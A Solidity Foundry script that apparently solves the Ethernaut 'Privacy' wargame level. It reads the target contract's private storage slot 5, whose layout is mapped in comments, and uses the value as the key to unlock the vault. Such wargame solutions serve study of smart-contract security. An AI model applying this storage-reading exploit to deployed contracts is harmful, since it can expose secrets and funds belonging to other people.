// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "../levels/12-Privacy.sol";
import "forge-std/Script.sol";

contract Attack is Script {
    Privacy privacy = Privacy(0x7Ee1208913B000c7E7D4bE8a55E94Ed86bFb38D0);

    function run() external{
        vm.startBroadcast();

        //   bool public locked = true;                             # slot 0
        //   uint256 public ID = block.timestamp;                   # slot 1
        //   uint8 private flattening = 10;                         # slot 2
        //   uint8 private denomination = 255;                      # slot 2
        //   uint16 private awkwardness = uint16(block.timestamp);  # slot 2
        //   bytes32[3] private data;                               # slot 3, 4, *5*
        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));

        // Unlock vault with password from storage
        privacy.unlock(bytes16(key));

        assert(privacy.locked() == false);

        vm.stopBroadcast();
    }
}